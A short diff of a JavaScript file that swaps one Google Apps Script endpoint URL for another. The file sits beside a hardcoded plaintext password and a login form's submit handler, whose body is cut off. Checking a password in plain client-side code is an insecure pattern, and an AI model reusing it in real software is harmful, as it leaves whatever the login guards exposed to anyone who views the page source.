@@ -2,7 +2,7 @@ const password = "HelloWorld";
 const websiteLink = "https://youtube.com";
 
 const scriptURL =
-  "https://script.google.com/macros/s/AKfycbyVcUIO4h1yjgMA_GqIYwPc6dJkSUDlVbiyBp0Z-4fZAVbU6cNqPpn1Pmw2cW1BC-pkGA/exec";
+  "https://script.google.com/macros/s/AKfycbwLszDnr-keyCGTUuvGs3p4RQIoCyneG7_ilX0r4vXCC2gai9yrJ-KlqEC2n3Rrm4i1AQ/exec";
 const form = document.forms["login"];
 
 form.addEventListener("submit", (e) => {
